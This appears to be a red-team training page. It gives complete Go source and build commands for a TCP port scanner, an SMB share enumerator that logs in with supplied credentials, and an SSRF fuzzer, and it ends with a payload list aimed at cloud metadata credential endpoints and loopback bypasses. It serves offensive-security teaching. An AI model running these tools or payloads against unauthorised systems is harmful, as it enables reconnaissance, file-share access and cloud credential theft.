---
layout: training-page
title: "Go Offensive Tools — Red Team Academy"
module: "Programming"
tags:
  - golang
  - offensive-tools
  - red-team
  - exploitation
page_key: "prog-go-offensive-tools"
render_with_liquid: false
---

# Go Offensive Tools

Three complete, standalone Go programs that compile with `go build` and cover common red team needs: port scanning, SMB enumeration, and SSRF probing. Each is a self-contained `main` package with all imports listed.

---

## Program 1: Concurrent TCP Port Scanner with Banner Grabbing

Scans TCP ports concurrently, grabs service banners, and outputs results as a table to stdout and optionally as JSON to a file.

```bash
# Build
go build -ldflags "-s -w" -o portscan ./portscan.go

# Usage examples
./portscan -host 10.0.0.1 -ports 1-1024 -concurrency 200 -timeout 2s
./portscan -host 10.0.0.1 -ports "22,80,443,3389,8080-8090" -output results.json
```

```go
// portscan.go
// Build: go build -ldflags "-s -w" -o portscan portscan.go
// Usage: ./portscan -host 10.0.0.1 -ports "1-1024,3389,8080" -concurrency 150 -timeout 2s -output out.json
package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
)

// ScanResult holds information about a single scanned port.
type ScanResult struct {
	Port   int    `json:"port"`
	State  string `json:"state"`
	Banner string `json:"banner,omitempty"`
}

// parsePorts converts a port spec like "1-1024,3389,8080-8090" into a sorted slice of ints.
func parsePorts(spec string) ([]int, error) {
	seen := make(map[int]bool)
	for _, part := range strings.Split(spec, ",") {
		part = strings.TrimSpace(part)
		if strings.Contains(part, "-") {
			bounds := strings.SplitN(part, "-", 2)
			lo, err1 := strconv.Atoi(bounds[0])
			hi, err2 := strconv.Atoi(bounds[1])
			if err1 != nil || err2 != nil || lo < 1 || hi > 65535 || lo > hi {
				return nil, fmt.Errorf("invalid range: %s", part)
			}
			for p := lo; p <= hi; p++ {
				seen[p] = true
			}
		} else {
			p, err := strconv.Atoi(part)
			if err != nil || p < 1 || p > 65535 {
				return nil, fmt.Errorf("invalid port: %s", part)
			}
			seen[p] = true
		}
	}
	ports := make([]int, 0, len(seen))
	for p := range seen {
		ports = append(ports, p)
	}
	sort.Ints(ports)
	return ports, nil
}

// grabBanner attempts to read up to 512 bytes from an open connection within 2 seconds.
func grabBanner(conn net.Conn) string {
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	buf := make([]byte, 512)
	n, _ := conn.Read(buf)
	banner := strings.TrimSpace(string(buf[:n]))
	// Replace non-printable characters
	var b strings.Builder
	for _, r := range banner {
		if r >= 0x20 && r < 0x7f {
			b.WriteRune(r)
		} else {
			b.WriteRune('.')
		}
	}
	return b.String()
}

// scanPort dials a single port, grabs a banner, and returns a ScanResult.
func scanPort(host string, port int, timeout time.Duration) ScanResult {
	addr := net.JoinHostPort(host, strconv.Itoa(port))
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return ScanResult{Port: port, State: "closed"}
	}
	defer conn.Close()
	banner := grabBanner(conn)
	return ScanResult{Port: port, State: "open", Banner: banner}
}

func main() {
	host := flag.String("host", "", "Target host or IP (required)")
	portSpec := flag.String("ports", "1-1024", "Port spec: ranges and individual ports, e.g. \"1-1024,3389,8080\"")
	concurrency := flag.Int("concurrency", 100, "Number of concurrent goroutines")
	timeout := flag.Duration("timeout", 2*time.Second, "Connection timeout per port")
	output := flag.String("output", "", "Optional JSON output file path")
	flag.Parse()

	if *host == "" {
		fmt.Fprintln(os.Stderr, "error: -host is required")
		flag.Usage()
		os.Exit(1)
	}

	ports, err := parsePorts(*portSpec)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error parsing ports: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("Scanning %s — %d ports — concurrency %d — timeout %v\n\n",
		*host, len(ports), *concurrency, *timeout)

	var (
		mu      sync.Mutex
		wg      sync.WaitGroup
		results []ScanResult
		sem     = make(chan struct{}, *concurrency)
	)

	for _, port := range ports {
		wg.Add(1)
		sem <- struct{}{}
		go func(p int) {
			defer wg.Done()
			defer func() { <-sem }()
			result := scanPort(*host, p, *timeout)
			if result.State == "open" {
				mu.Lock()
				results = append(results, result)
				mu.Unlock()
			}
		}(port)
	}
	wg.Wait()

	// Sort open ports numerically for display
	sort.Slice(results, func(i, j int) bool {
		return results[i].Port < results[j].Port
	})

	// Print table to stdout
	fmt.Printf("%-8s %-10s %s\n", "PORT", "STATE", "BANNER")
	fmt.Println(strings.Repeat("-", 70))
	for _, r := range results {
		banner := r.Banner
		if len(banner) > 50 {
			banner = banner[:50] + "..."
		}
		fmt.Printf("%-8d %-10s %s\n", r.Port, r.State, banner)
	}
	fmt.Printf("\n%d open ports found.\n", len(results))

	// Write JSON output if requested
	if *output != "" {
		data, err := json.MarshalIndent(results, "", "  ")
		if err != nil {
			fmt.Fprintf(os.Stderr, "json marshal error: %v\n", err)
			os.Exit(1)
		}
		if err := os.WriteFile(*output, data, 0600); err != nil {
			fmt.Fprintf(os.Stderr, "write error: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("Results written to %s\n", *output)
	}
}
```

**Key design points:**

- Port spec parser handles `1-1024`, `22,80,443`, and mixed formats like `1-1024,3389,8080-8090`
- Semaphore pattern with a buffered channel controls goroutine count precisely
- Banner grab uses `SetReadDeadline` so slow/silent services don't block workers
- Non-printable bytes in banners are replaced with `.` to keep output clean
- JSON output is written with `0600` permissions — results may include sensitive info

---

## Program 2: SMB Share Enumerator

Connects to TCP 445, negotiates an SMB session using `github.com/hirochachacha/go-smb2`, authenticates with provided credentials (NTLM), lists shares, and attempts to list file contents of each accessible share.

```bash
# Install dependency
go get github.com/hirochachacha/go-smb2

# Build
go build -ldflags "-s -w" -o smblist ./smblist.go

# Usage
./smblist --host 10.0.0.5 --user administrator --pass 'Password123!' --domain CORP
./smblist --host 10.0.0.5 --user guest --pass '' --domain ''
```

```go
// smblist.go
// Build: go get github.com/hirochachacha/go-smb2 && go build -ldflags "-s -w" -o smblist smblist.go
// Usage: ./smblist --host 192.168.1.1 --user admin --pass 'P@ss!' --domain CORP
package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"strings"
	"time"

	"github.com/hirochachacha/go-smb2"
)

// ShareInfo describes an enumerated share and its accessibility.
type ShareInfo struct {
	Name        string
	Accessible  bool
	Files       []string
	AccessError string
}

// connectSMB dials TCP 445 and returns an authenticated SMB2 session.
func connectSMB(host, user, pass, domain string, timeout time.Duration) (*smb2.Session, net.Conn, error) {
	addr := net.JoinHostPort(host, "445")
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return nil, nil, fmt.Errorf("TCP dial failed: %w", err)
	}

	dialer := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     user,
			Password: pass,
			Domain:   domain,
		},
	}

	session, err := dialer.Dial(conn)
	if err != nil {
		conn.Close()
		return nil, nil, fmt.Errorf("SMB auth failed: %w", err)
	}
	return session, conn, nil
}

// listShareContents mounts a share and lists files in the root directory.
func listShareContents(session *smb2.Session, shareName string) ([]string, error) {
	fs, err := session.Mount(shareName)
	if err != nil {
		return nil, err
	}
	defer fs.Umount()

	entries, err := fs.ReadDir(".")
	if err != nil {
		return nil, err
	}

	var files []string
	for _, entry := range entries {
		entryType := "file"
		if entry.IsDir() {
			entryType = "dir"
		}
		files = append(files, fmt.Sprintf("[%s] %s", entryType, entry.Name()))
		// Limit output to first 25 entries to avoid flooding
		if len(files) >= 25 {
			files = append(files, "... (truncated at 25 entries)")
			break
		}
	}
	return files, nil
}

func main() {
	host := flag.String("host", "", "Target host or IP (required)")
	user := flag.String("user", "guest", "SMB username")
	pass := flag.String("pass", "", "SMB password")
	domain := flag.String("domain", "", "SMB domain or workgroup")
	timeout := flag.Duration("timeout", 10*time.Second, "Connection timeout")
	flag.Parse()

	if *host == "" {
		fmt.Fprintln(os.Stderr, "error: --host is required")
		flag.Usage()
		os.Exit(1)
	}

	fmt.Printf("Connecting to %s as %s\\%s ...\n", *host, *domain, *user)

	session, conn, err := connectSMB(*host, *user, *pass, *domain, *timeout)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Connection failed: %v\n", err)
		os.Exit(1)
	}
	defer conn.Close()
	defer session.Logoff()

	fmt.Println("Authenticated successfully.\n")

	// List available shares using NetShareEnum via session
	shareNames, err := session.ListSharenames()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to list shares: %v\n", err)
		os.Exit(1)
	}

	shares := make([]ShareInfo, 0, len(shareNames))
	for _, name := range shareNames {
		info := ShareInfo{Name: name}
		files, err := listShareContents(session, name)
		if err != nil {
			info.Accessible = false
			info.AccessError = err.Error()
		} else {
			info.Accessible = true
			info.Files = files
		}
		shares = append(shares, info)
	}

	// Print results
	fmt.Printf("%-25s %-12s %s\n", "SHARE", "ACCESSIBLE", "CONTENTS / ERROR")
	fmt.Println(strings.Repeat("-", 80))
	for _, s := range shares {
		if s.Accessible {
			fmt.Printf("%-25s %-12s %d items\n", s.Name, "YES", len(s.Files))
			for _, f := range s.Files {
				fmt.Printf("  %s\n", f)
			}
		} else {
			short := s.AccessError
			if len(short) > 50 {
				short = short[:50] + "..."
			}
			fmt.Printf("%-25s %-12s %s\n", s.Name, "NO", short)
		}
	}

	fmt.Printf("\n%d shares enumerated.\n", len(shares))
}
```

**Key design points:**

- Uses `github.com/hirochachacha/go-smb2` — the most maintained pure-Go SMB2 library (no CGO, cross-compiles cleanly)
- NTLM auth is handled by the library's `NTLMInitiator` — supports pass-through for both domain and local accounts
- `session.ListSharenames()` uses the NetShareEnum RPC call under the hood
- `fs.ReadDir(".")` reads the share root; change the path string to enumerate subdirectories
- Results are truncated at 25 entries per share to avoid excessive output

---

## Program 3: SSRF Probe Tool

Tests a target URL for Server-Side Request Forgery vulnerabilities. Sends requests with a FUZZ placeholder replaced by internal addresses from a wordlist, compares response size and status to a baseline, and flags anomalies as potential SSRF hits.

```bash
# Build
go build -ldflags "-s -w" -o ssrfprobe ./ssrfprobe.go

# Usage: FUZZ in the URL is replaced with each wordlist entry
./ssrfprobe --url "https://target.com/fetch?url=FUZZ" --wordlist ips.txt --threads 20 --timeout 8s

# Example wordlist entries (ips.txt):
# http://169.254.169.254/latest/meta-data/
# http://10.0.0.1/
# http://192.168.1.1/admin
# http://[::1]/
# http://0177.0.0.1/          (octal bypass)
# http://2130706433/           (decimal IP bypass for 127.0.0.1)
```

```go
// ssrfprobe.go
// Build: go build -ldflags "-s -w" -o ssrfprobe ssrfprobe.go
// Usage: ./ssrfprobe --url "https://target.com/api?u=FUZZ" --wordlist payloads.txt --threads 15 --timeout 8s
package main

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

// Hit represents a potential SSRF finding.
type Hit struct {
	Payload        string `json:"payload"`
	URL            string `json:"url"`
	StatusCode     int    `json:"status_code"`
	ContentLength  int64  `json:"content_length"`
	BaselineStatus int    `json:"baseline_status"`
	BaselineLength int64  `json:"baseline_length"`
	Reason         string `json:"reason"`
}

// buildClient returns an http.Client that does not follow redirects,
// uses TLS skip verify, and respects the given timeout.
func buildClient(timeout time.Duration) *http.Client {
	return &http.Client{
		Timeout: timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			// Return the redirect response as-is — SSRF often shows in redirect targets
			return http.ErrUseLastResponse
		},
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
}

// probe sends a GET request and returns status code and body length.
func probe(client *http.Client, targetURL string) (int, int64, error) {
	resp, err := client.Get(targetURL)
	if err != nil {
		return 0, 0, err
	}
	defer resp.Body.Close()
	n, _ := io.Copy(io.Discard, resp.Body)
	return resp.StatusCode, n, nil
}

// buildPayloads returns the URL with FUZZ replaced by the payload.
// It also generates common bypass variants.
func buildPayloads(urlTemplate, payload string) []string {
	base := strings.ReplaceAll(urlTemplate, "FUZZ", payload)
	return []string{base}
}

// loadWordlist reads a file line by line and returns non-empty, non-comment lines.
func loadWordlist(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var lines []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		lines = append(lines, line)
	}
	return lines, scanner.Err()
}

// isHit compares a probe result to the baseline and returns true if it looks like SSRF.
func isHit(status int, length int64, baselineStatus int, baselineLength int64) (bool, string) {
	// Different status code from baseline
	if status != baselineStatus {
		return true, fmt.Sprintf("status changed: %d → %d", baselineStatus, status)
	}
	// Significantly different response size (>200 bytes difference)
	diff := length - baselineLength
	if diff < 0 {
		diff = -diff
	}
	if diff > 200 {
		return true, fmt.Sprintf("content length changed: %d → %d (diff %d)", baselineLength, length, diff)
	}
	return false, ""
}

func main() {
	urlTemplate := flag.String("url", "", "Target URL with FUZZ placeholder (required), e.g. https://target.com/fetch?u=FUZZ")
	wordlistPath := flag.String("wordlist", "", "Path to payload wordlist (required)")
	threads := flag.Int("threads", 10, "Number of concurrent threads")
	timeout := flag.Duration("timeout", 8*time.Second, "Request timeout")
	outputPath := flag.String("output", "", "Optional JSON output file for hits")
	flag.Parse()

	if *urlTemplate == "" || *wordlistPath == "" {
		fmt.Fprintln(os.Stderr, "error: --url and --wordlist are required")
		flag.Usage()
		os.Exit(1)
	}
	if !strings.Contains(*urlTemplate, "FUZZ") {
		fmt.Fprintln(os.Stderr, "error: --url must contain the FUZZ placeholder")
		os.Exit(1)
	}

	payloads, err := loadWordlist(*wordlistPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error reading wordlist: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("Loaded %d payloads from %s\n", len(payloads), *wordlistPath)

	client := buildClient(*timeout)

	// Establish baseline using an unlikely internal address
	baselineURL := strings.ReplaceAll(*urlTemplate, "FUZZ", "http://ssrfprobe-baseline-nxdomain.invalid/")
	fmt.Printf("Establishing baseline with: %s\n", baselineURL)
	baselineStatus, baselineLength, err := probe(client, baselineURL)
	if err != nil {
		// Baseline may error — use 0 values
		fmt.Printf("Baseline error (treating as 0/0): %v\n", err)
		baselineStatus = 0
		baselineLength = 0
	} else {
		fmt.Printf("Baseline: status=%d length=%d\n\n", baselineStatus, baselineLength)
	}

	var (
		mu   sync.Mutex
		wg   sync.WaitGroup
		hits []Hit
		sem  = make(chan struct{}, *threads)
	)

	for _, payload := range payloads {
		for _, probeURL := range buildPayloads(*urlTemplate, payload) {
			wg.Add(1)
			sem <- struct{}{}
			go func(pl, pu string) {
				defer wg.Done()
				defer func() { <-sem }()

				status, length, err := probe(client, pu)
				if err != nil {
					// Network error — skip silently
					return
				}

				hit, reason := isHit(status, length, baselineStatus, baselineLength)
				if hit {
					h := Hit{
						Payload:        pl,
						URL:            pu,
						StatusCode:     status,
						ContentLength:  length,
						BaselineStatus: baselineStatus,
						BaselineLength: baselineLength,
						Reason:         reason,
					}
					mu.Lock()
					hits = append(hits, h)
					mu.Unlock()
					fmt.Printf("[HIT] payload=%-45s status=%d length=%d reason=%s\n",
						pl, status, length, reason)
				} else {
					fmt.Printf("[ -- ] payload=%-45s status=%d length=%d\n", pl, status, length)
				}
			}(payload, probeURL)
		}
	}
	wg.Wait()

	fmt.Printf("\nDone. %d/%d payloads triggered anomalies.\n", len(hits), len(payloads))

	if *outputPath != "" && len(hits) > 0 {
		data, err := json.MarshalIndent(hits, "", "  ")
		if err != nil {
			fmt.Fprintf(os.Stderr, "json error: %v\n", err)
			os.Exit(1)
		}
		if err := os.WriteFile(*outputPath, data, 0600); err != nil {
			fmt.Fprintf(os.Stderr, "write error: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("Hits written to %s\n", *outputPath)
	}
}
```

**Key design points:**

- `CheckRedirect: func(...) error { return http.ErrUseLastResponse }` — stops the client from following redirects, which is critical because SSRF often manifests as a redirect to an internal resource
- Baseline is established against a guaranteed-NXDOMAIN URL so any response to internal addresses stands out
- Anomaly detection uses both status code change and response body size difference (>200 bytes threshold)
- The wordlist supports common SSRF bypass formats in the payloads themselves:
  - `http://169.254.169.254/` — AWS/GCP metadata
  - `http://2130706433/` — decimal representation of 127.0.0.1
  - `http://0177.0.0.1/` — octal representation of 127.0.0.1
  - `http://[::1]/` — IPv6 loopback
  - `http://localhost/` — hostname-based bypass

---

## Sample Payload Wordlists

### SSRF Internal Targets (save as `ssrf-payloads.txt`)

```
# Cloud metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/metadata/v1/maintenance

# Loopback bypasses
http://127.0.0.1/
http://127.0.0.1:8080/
http://2130706433/
http://0177.0.0.1/
http://[::1]/
http://localhost/

# Common internal ranges
http://10.0.0.1/
http://10.0.0.1/admin
http://192.168.1.1/
http://172.16.0.1/
```

---

## Resources

- Go standard library — net/http: https://pkg.go.dev/net/http
- Go standard library — net: https://pkg.go.dev/net
- go-smb2 (hirochachacha): https://github.com/hirochachacha/go-smb2
- golang.org/x/sys: https://pkg.go.dev/golang.org/x/sys
- golang.org/x/sys/windows: https://pkg.go.dev/golang.org/x/sys/windows
- Go cross-compilation docs: https://pkg.go.dev/cmd/go#hdr-Environment_variables
- OWASP SSRF Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
